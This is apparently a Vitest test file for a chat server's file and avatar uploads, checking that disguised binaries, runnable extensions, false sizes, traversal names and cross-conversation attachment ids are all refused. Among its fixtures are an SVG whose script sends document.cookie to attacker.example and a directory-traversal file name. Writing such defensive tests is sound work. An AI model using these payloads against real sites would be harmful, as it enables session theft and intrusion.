/**
 * File and image sharing (phase 4).
 *
 * The brief's rule for this area is a list of things not to trust, so every test
 * here attacks the server with a client that is lying about something:
 *
 *   - bytes that are a PE binary inside a file named `notes.txt`
 *   - an extension the operating system would run (`.ps1`, `.exe`)
 *   - a declared size far below what is actually sent
 *   - a directory traversal in the file name
 *   - an attachment id that belongs to somebody else's conversation
 *
 * Real streams are uploaded over real HTTP to a real server, and the result is
 * checked in the database, on the filesystem, and in the bytes handed back.
 */
import { describe, it, expect, afterEach } from 'vitest';
import fs from 'node:fs';
import path from 'node:path';
import crypto from 'node:crypto';
import { boot, SKIP, SKIP_REASON, PNG_BYTES, PE_HEADERS_IN_A_TXT, streamOf } from './helpers';

const SOURCE = [
  "'use strict';",
  '/** A module someone actually wrote, with a é character and a tab\there. */',
  'module.exports = { greet: (who) => `hello ${who}` };',
  '',
].join('\n');

/** A minimal store-and-forward zip header block; enough for the signature table. */
const ZIP_BYTES = Buffer.concat([
  Buffer.from([0x50, 0x4b, 0x03, 0x04]),
  Buffer.alloc(26, 0),
  Buffer.from('readme.txt'),
  Buffer.from('stored, never run'),
]);

const GIF_BYTES = Buffer.concat([
  Buffer.from('GIF89a', 'latin1'),
  Buffer.from([0x01, 0x00, 0x01, 0x00, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0xff, 0xff, 0x2c, 0x00, 0x00, 0x00, 0x00]),
  Buffer.from([0x01, 0x00, 0x01, 0x00, 0x00, 0x02, 0x02, 0x44, 0x01, 0x00, 0x3b]),
]);

const SVG_WITH_SCRIPT = Buffer.from(
  '<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10">'
  + '<script>fetch("http://attacker.example/" + document.cookie)</script>'
  + '<rect width="10" height="10" fill="red"/></svg>',
  'utf8',
);

describe.runIf(!SKIP)('NovaLink Live attachments', () => {
  let harness = null;

  afterEach(async () => {
    if (harness) await harness.close();
    harness = null;
  });

  /** alice + bob as contacts with one open thread and bob listening. */
  async function thread(prefix) {
    const alice = await harness.register(`${prefix}_alice`);
    const bob = await harness.register(`${prefix}_bob`);
    await harness.becomeFriends(alice, bob);
    const bobSocket = await harness.connectSocket(bob);
    const id = (await alice.client.post('/api/conversations', { otherUserId: bob.id })).conversation.id;
    return { alice, bob, bobSocket, id };
  }

  function upload(account, { conversationId, fileName, bytes, body }) {
    const query = `?conversationId=${conversationId}&fileName=${encodeURIComponent(fileName)}&bytes=${bytes}`;
    return account.client.call('POST', '/api/uploads', undefined, { raw: streamOf(body), query }).then(reportServerFailure);
  }

  /**
   * A 5xx is not a refusal. Left as an assertion on the status it shows up as an
   * undefined field somewhere downstream, which sends you looking in the wrong file.
   */
  function reportServerFailure(result) {
    if (result.__status >= 500) throw new Error(`the server failed the request: ${JSON.stringify(result)}`);
    return result;
  }

  it('accepts a real image and stores it under a name the client did not choose', async () => {
    harness = await boot();
    const { alice, bob, id } = await thread('png');

    const sent = await upload(alice, { conversationId: id, fileName: 'screenshot.png', bytes: PNG_BYTES.length, body: PNG_BYTES });
    expect(sent.__status).toBe(201);
    expect(sent.attachment).toMatchObject({
      fileName: 'screenshot.png',
      mimeType: 'image/png',
      kind: 'image',
      bytes: PNG_BYTES.length,
    });
    expect(sent.attachment.sha256).toMatch(/^[0-9a-f]{64}$/);
    expect(sent.attachment.sha256).toBe(crypto.createHash('sha256').update(PNG_BYTES).digest('hex'));
    expect(sent.attachment.expiresAt).toBeGreaterThan(sent.attachment.createdAt);

    // The blob on disk is a generated uuid. The display name never becomes a path,
    // so a name collision cannot overwrite anyone else's file.
    const stored = fs.readdirSync(harness.filesDir);
    expect(stored).toHaveLength(1);
    expect(stored[0]).toBe(`${sent.attachment.id}.png`);
    expect(fs.readFileSync(path.join(harness.filesDir, stored[0]))).toEqual(PNG_BYTES);

    const downloaded = await bob.client.rawBytes(`/api/files/${sent.attachment.id}`);
    expect(downloaded.status).toBe(200);
    expect(downloaded.headers['content-type']).toBe('image/png');
    expect(downloaded.headers['content-length']).toBe(String(PNG_BYTES.length));
    expect(downloaded.headers['x-content-sha256']).toBe(sent.attachment.sha256);
    // An image is previewable; the name is offered back as a save default.
    expect(downloaded.headers['content-disposition']).toContain('inline');
    expect(downloaded.headers['content-disposition']).toContain("filename*=UTF-8''screenshot.png");
    expect(downloaded.buffer).toEqual(PNG_BYTES);
  });

  it('decides the type from the bytes, so a binary dressed as a note is refused', async () => {
    harness = await boot();
    const { alice, id } = await thread('pe');

    // The exact case the brief calls out: executable content, innocent name, and a
    // declared MIME that would have said text/plain.
    const disguised = await upload(alice, { conversationId: id, fileName: 'notes.txt', bytes: 12, body: PE_HEADERS_IN_A_TXT });
    expect(disguised.__status).toBe(415);
    expect(disguised.error.code).toBe('file_type_refused');
    expect(disguised.error.message).toMatch(/windows-executable/);
    // Nothing kept: not a row, not a blob, not a leftover temp file.
    expect(harness.store.get('SELECT COUNT(*) AS n FROM attachments').n).toBe(0);
    expect(fs.readdirSync(harness.filesDir)).toEqual([]);
    expect(fs.readdirSync(path.join(harness.dataDir, 'tmp'))).toEqual([]);

    // An extension the OS treats as runnable is refused even when the content is a
    // perfectly harmless poem, because that is what gets double-clicked.
    for (const name of ['cleanup.ps1', 'installer.exe', 'start.sh', 'profile.reg']) {
      const refused = await upload(alice, { conversationId: id, fileName: name, bytes: 10, body: Buffer.from('# just notes\n', 'utf8') });
      expect(refused.__status, name).toBe(415);
      expect(refused.error.code, name).toBe('file_type_refused');
    }
    expect(fs.readdirSync(harness.filesDir)).toEqual([]);
  });

  it('takes a source file as text and reports it as text, whatever the client claimed', async () => {
    harness = await boot();
    const { alice, id } = await thread('src');

    const sent = await upload(alice, {
      conversationId: id,
      fileName: 'index.js',
      bytes: 1, // a lie about size: only the counted bytes are trusted
      body: Buffer.from(SOURCE, 'utf8'),
    });
    expect(sent.__status).toBe(201);
    expect(sent.attachment).toMatchObject({ fileName: 'index.js', kind: 'text', bytes: Buffer.byteLength(SOURCE) });
    // The label is the server's own verdict on the bytes, not the client's claim,
    // and the extension on disk is the one WE detected.
    expect(sent.attachment.mimeType).toBe('text/plain; charset=utf-8');
    expect(fs.readdirSync(harness.filesDir)).toEqual([`${sent.attachment.id}.js`]);

    const downloaded = await alice.client.rawBytes(`/api/files/${sent.attachment.id}`);
    expect(downloaded.buffer.toString('utf8')).toBe(SOURCE);
    expect(downloaded.headers['content-type']).toBe('text/plain; charset=utf-8');

    // An unrecognisable blob is still shareable, but labelled the way a server
    // should label something it cannot classify.
    const opaque = await upload(alice, {
      conversationId: id,
      fileName: 'mystery.dat',
      bytes: 512,
      body: Buffer.concat([Buffer.from([0x00, 0x01, 0x02]), crypto.randomBytes(509)]),
    });
    expect(opaque.attachment).toMatchObject({ kind: 'document', mimeType: 'application/octet-stream' });
    const asZip = await upload(alice, { conversationId: id, fileName: 'bundle.zip', bytes: ZIP_BYTES.length, body: ZIP_BYTES });
    expect(asZip.attachment).toMatchObject({ kind: 'archive', mimeType: 'application/zip' });
    const zipDownload = await alice.client.head(`/api/files/${asZip.attachment.id}`);
    expect(zipDownload.headers.get('content-disposition')).toMatch(/^attachment/);
    expect(zipDownload.headers.get('content-type')).toBe('application/zip');
  });

  it('refuses a file larger than the limit while it is still arriving', async () => {
    // The cap is lowered through the same environment variable an operator sets.
    harness = await boot({ env: { LINK_MAX_FILE_BYTES: '8192' } });
    const { alice, id } = await thread('big');
    expect(harness.config.limits.maxFileBytes).toBe(8192);

    // The hard case: the client declares a size that would fit and then sends far
    // more, so only counting bytes as they stream can catch it. The client has to
    // get a real 413 back, not a socket error that looks like a network fault.
    const poured = Buffer.alloc(64 * 1024, 0x41);
    const lied = await upload(alice, { conversationId: id, fileName: 'logs.txt', bytes: 100, body: poured });
    expect(lied.__status).toBe(413);
    expect(lied.error.code).toBe('file_too_large');
    expect(harness.store.get('SELECT COUNT(*) AS n FROM attachments').n).toBe(0);
    expect(fs.readdirSync(harness.filesDir)).toEqual([]);
    // The partial upload is unlinked rather than left to accumulate in tmp.
    expect(fs.readdirSync(path.join(harness.dataDir, 'tmp'))).toEqual([]);

    // A declared size over the cap is refused before a single byte is read.
    const lie = await upload(alice, { conversationId: id, fileName: 'tiny.txt', bytes: 10 * 1024 * 1024, body: Buffer.from('hi', 'utf8') });
    expect(lie.__status).toBe(413);
    expect(lie.error.code).toBe('file_too_large');

    // Exactly at the cap is still a file the server takes.
    const edge = await upload(alice, { conversationId: id, fileName: 'edge.txt', bytes: 8192, body: Buffer.alloc(8192, 0x42) });
    expect(edge.__status).toBe(201);
    expect(edge.attachment.bytes).toBe(8192);

    // And an empty upload is a mistake, not a stored zero-byte file.
    const nothing = await upload(alice, { conversationId: id, fileName: 'nothing.txt', bytes: 0, body: Buffer.alloc(0) });
    expect(nothing.__status).toBe(400);
    expect(nothing.error.code).toBe('empty_file');
  });

  it('will not hand a file to someone who is not in the conversation that owns it', async () => {
    harness = await boot();
    const { alice, bob, id } = await thread('acl');
    const stranger = await harness.register('acl_stranger');

    const sent = await upload(alice, { conversationId: id, fileName: 'keys.txt', bytes: SOURCE.length, body: Buffer.from(SOURCE, 'utf8') });
    const fileId = sent.attachment.id;

    const peek = await stranger.client.get(`/api/files/${fileId}`);
    expect(peek.__status).toBe(404);
    // Membership is the check, so the refusal is the ordinary "not yours" answer:
    // the id is not confirmed to exist for someone outside the thread.
    expect(peek.error.code).toBe('no_conversation');
    const strangerDeletes = await stranger.client.del(`/api/files/${fileId}`);
    expect(strangerDeletes.__status).toBe(404);
    expect(strangerDeletes.error.code).toBe('no_conversation');
    expect((await stranger.client.get(`/api/conversations/${id}/attachments`)).__status).toBe(404);
    expect(fs.existsSync(path.join(harness.filesDir, `${fileId}.txt`))).toBe(true);

    // Only the uploader may delete it: being in the thread is not enough. Here the
    // id *is* confirmed, because bob belongs to the thread that owns the file.
    const bobTries = await bob.client.del(`/api/files/${fileId}`);
    expect(bobTries.__status).toBe(403);
    expect(bobTries.error.code).toBe('not_your_file');
    expect(fs.existsSync(path.join(harness.filesDir, `${fileId}.txt`))).toBe(true);

    const mine = await alice.client.del(`/api/files/${fileId}`);
    expect(mine.__status).toBe(200);
    expect(mine.ok).toBe(true);
    expect(fs.existsSync(path.join(harness.filesDir, `${fileId}.txt`))).toBe(false);
    expect((await alice.client.get(`/api/files/${fileId}`)).__status).toBe(404);
  });

  it('attaches only files the sender uploaded, to the conversation they were uploaded for', async () => {
    harness = await boot();
    const { alice, bob, bobSocket, id } = await thread('claim');
    const other = await harness.register('claim_carol');
    await harness.becomeFriends(alice, other);
    const otherThread = (await alice.client.post('/api/conversations', { otherUserId: other.id })).conversation.id;

    const mine = (await upload(alice, { conversationId: id, fileName: 'diagram.png', bytes: PNG_BYTES.length, body: PNG_BYTES })).attachment;
    const elsewhere = (await upload(alice, { conversationId: otherThread, fileName: 'elsewhere.png', bytes: PNG_BYTES.length, body: PNG_BYTES })).attachment;

    // carol cannot attach alice's file, and alice cannot move a file across threads.
    const stolen = await other.client.post(`/api/conversations/${otherThread}/messages`, { body: 'take yours', attachmentIds: [mine.id] });
    expect(stolen.__status).toBe(403);
    expect(stolen.error.code).toBe('not_your_file');
    const crossed = await alice.client.post(`/api/conversations/${id}/messages`, { body: 'wrong room', attachmentIds: [elsewhere.id] });
    expect(crossed.__status).toBe(403);
    expect(crossed.error.code).toBe('wrong_conversation');
    const invented = await alice.client.post(`/api/conversations/${id}/messages`, { body: 'guess', attachmentIds: ['00000000-0000-4000-8000-000000000000'] });
    expect(invented.__status).toBe(404);
    expect(invented.error.code).toBe('no_attachment');

    const tooMany = Array.from({ length: harness.config.limits.attachmentsPerMessage + 1 }, () => mine.id);
    const flooded = await alice.client.post(`/api/conversations/${id}/messages`, { body: 'spam', attachmentIds: tooMany });
    expect(flooded.__status).toBe(400);
    expect(flooded.error.code).toBe('too_many_attachments');

    const posted = await alice.client.post(`/api/conversations/${id}/messages`, { body: 'the diagram is attached', attachmentIds: [mine.id] });
    expect(posted.__status).toBe(201);
    expect(posted.message.attachmentIds).toEqual([mine.id]);
    expect(posted.message.attachments[0]).toMatchObject({ fileName: 'diagram.png', mimeType: 'image/png', bytes: PNG_BYTES.length });

    const pushed = await bobSocket.waitFor('message', (frame) => frame.message?.attachmentIds?.length);
    expect(pushed.message.attachments[0].id).toBe(mine.id);
    // bob can open it, because he is in the thread that owns it.
    expect((await bob.client.rawBytes(`/api/files/${mine.id}`)).status).toBe(200);
    expect((await bob.client.get(`/api/conversations/${id}/attachments`)).items.map((item) => item.id)).toEqual([mine.id]);

    // A file that is only uploaded but never attached is not in anyone's history.
    const list = await alice.client.get(`/api/conversations/${otherThread}/attachments`);
    expect(list.items.map((item) => item.id)).toEqual([elsewhere.id]);
  });

  it('expires files on the policy the operator configured, and the sweep frees the disk', async () => {
    harness = await boot();
    const { alice, id } = await thread('old');
    const sent = await upload(alice, { conversationId: id, fileName: 'old-news.png', bytes: PNG_BYTES.length, body: PNG_BYTES });
    const posted = await alice.client.post(`/api/conversations/${id}/messages`, { body: 'look at this', attachmentIds: [sent.attachment.id] });

    // Fast-forward instead of sleeping for the configured 30 days: the expiry that
    // is tested is the one the row carries, and everything after it is real.
    harness.store.run('UPDATE attachments SET expires_at_ms = ? WHERE id = ?', Date.now() - 1000, sent.attachment.id);

    const late = await alice.client.get(`/api/files/${sent.attachment.id}`);
    expect(late.__status).toBe(410);
    expect(late.error.code).toBe('file_expired');
    // A message may not claim a file that is already out of service, either.
    const reopen = await alice.client.post(`/api/conversations/${id}/messages`, { body: 'again', attachmentIds: [sent.attachment.id] });
    expect(reopen.__status).toBe(410);
    expect(reopen.error.code).toBe('attachment_expired');

    const swept = harness.instance.attachments.sweep();
    expect(swept.expired).toBe(1);
    expect(fs.existsSync(path.join(harness.filesDir, `${sent.attachment.id}.png`))).toBe(false);
    expect(harness.store.get('SELECT deleted_at_ms FROM attachments WHERE id = ?', sent.attachment.id).deleted_at_ms).not.toBeNull();

    // The message survives: history is the truth about what was said, and it now
    // says the file is gone rather than offering a dead download.
    const page = (await alice.client.get(`/api/conversations/${id}/messages`)).items;
    expect(page.map((item) => item.id)).toContain(posted.message.id);
    expect(page.find((item) => item.id === posted.message.id).attachmentIds).toEqual([]);
    // Running it again is harmless, which matters because it runs on a timer.
    expect(harness.instance.attachments.sweep().expired).toBe(0);
  });

  it('takes a profile photo only when it is a raster image, and shows it to contacts', async () => {
    harness = await boot();
    const alice = await harness.register('face_alice');
    const bob = await harness.register('face_bob');
    await harness.becomeFriends(alice, bob);

    const put = (body, fileName, bytes) => alice.client.call('POST', '/api/me/avatar', undefined, {
      raw: streamOf(body),
      query: `?fileName=${encodeURIComponent(fileName)}&bytes=${bytes}`,
    }).then(reportServerFailure);

    const svg = await put(SVG_WITH_SCRIPT, 'logo.svg', SVG_WITH_SCRIPT.length);
    // An avatar is rendered inside somebody else's window without their consent, so
    // a container that can carry script is refused rather than sanitised.
    expect(svg.__status).toBe(415);
    expect(svg.error.code).toBe('not_an_image');
    const binary = await put(PE_HEADERS_IN_A_TXT, 'face.png', PE_HEADERS_IN_A_TXT.length);
    expect(binary.__status).toBe(415);
    expect(binary.error.code).toBe('file_type_refused');
    const text = await put(Buffer.from('#avatar\nnot a picture\n', 'utf8'), 'face.txt', 20);
    expect(text.__status).toBe(415);

    const first = await put(GIF_BYTES, 'face.gif', GIF_BYTES.length);
    expect(first.__status).toBe(201);
    expect(first.avatar).toMatchObject({ mimeType: 'image/gif', kind: 'image', bytes: GIF_BYTES.length });
    expect(first.user.avatarId).toBe(first.avatar.id);
    expect((await alice.client.get('/api/me')).user.avatarId).toBe(first.avatar.id);

    const seen = await bob.client.rawBytes(`/api/avatars/${first.avatar.id}`);
    expect(seen.status).toBe(200);
    expect(seen.headers['content-type']).toBe('image/gif');
    expect(seen.buffer).toEqual(GIF_BYTES);
    expect(seen.headers['content-disposition']).toMatch(/^inline/);

    // Replacing a photo retires the old blob, or a profile change leaks files forever.
    const second = await put(PNG_BYTES, 'face.png', PNG_BYTES.length);
    expect(second.__status).toBe(201);
    expect(second.user.avatarId).toBe(second.avatar.id);
    expect(fs.existsSync(path.join(harness.filesDir, `${first.avatar.id}.gif`))).toBe(false);
    expect((await bob.client.rawBytes(`/api/avatars/${first.avatar.id}`)).status).toBe(404);
    expect(fs.readdirSync(harness.filesDir)).toEqual([`${second.avatar.id}.png`]);

    const dropped = await alice.client.del('/api/me/avatar');
    expect(dropped.__status).toBe(200);
    expect(dropped.user.avatarId).toBeNull();
    expect(fs.readdirSync(harness.filesDir)).toEqual([]);
  });

  it('refuses a profile photo that is too big, using the avatar limit rather than the file limit', async () => {
    harness = await boot({ env: { LINK_MAX_AVATAR_BYTES: '4096' } });
    const alice = await harness.register('large_alice');
    expect(harness.config.limits.maxAvatarBytes).toBe(4096);
    expect(harness.config.limits.maxFileBytes).toBe(25 * 1024 * 1024);

    const tooBig = await alice.client.call('POST', '/api/me/avatar', undefined, {
      raw: streamOf(Buffer.alloc(64 * 1024, 0x41)),
      query: '?fileName=face.png&bytes=65536',
    });
    expect(tooBig.__status, JSON.stringify(tooBig)).toBe(413);
    expect(tooBig.error.code).toBe('file_too_large');
    expect(fs.readdirSync(harness.filesDir)).toEqual([]);
    expect(fs.readdirSync(path.join(harness.dataDir, 'tmp'))).toEqual([]);
  });

  it('cleans a hostile file name into a display field and never lets it touch the path', async () => {
    harness = await boot();
    const { alice, id } = await thread('evil');

    const traversal = await upload(alice, {
      conversationId: id,
      fileName: '../../../../windows/system32/evil.dll.png',
      bytes: PNG_BYTES.length,
      body: PNG_BYTES,
    });
    expect(traversal.__status).toBe(201);
    expect(traversal.attachment.fileName).toBe('evil.dll.png');
    // A generated uuid is the path; the display name is only a string in a row.
    expect(fs.existsSync(path.join(harness.dataDir, 'evil.dll.png'))).toBe(false);
    expect(fs.readdirSync(harness.filesDir)).toEqual([`${traversal.attachment.id}.png`]);

    const reserved = await upload(alice, { conversationId: id, fileName: 'CON.txt', bytes: 4, body: Buffer.from('note', 'utf8') });
    expect(reserved.attachment.fileName).toBe('_CON.txt');
    const control = await upload(alice, { conversationId: id, fileName: 'poison\r\n.txt', bytes: 4, body: Buffer.from('note', 'utf8') });
    expect(control.attachment.fileName).toBe('poison.txt');

    // The name is offered back to the recipient as a save default, so the response
    // header is the last place a crafted name could still cause damage.
    const downloaded = await alice.client.rawBytes(`/api/files/${traversal.attachment.id}`);
    expect(downloaded.headers['content-disposition']).toContain("filename*=UTF-8''evil.dll.png");
    expect(downloaded.headers['content-disposition']).not.toMatch(/\r|\n/);
  });
});

/**
 * A runtime without `node:sqlite` and a real streaming HTTP client cannot test any
 * of this, so the skip is reported with its reason instead of looking like a pass.
 */
describe.runIf(SKIP)('NovaLink Live attachments', () => {
  it(`skipped on this runtime: ${SKIP_REASON}`, () => {
    expect(SKIP).toBe(true);
  });
});
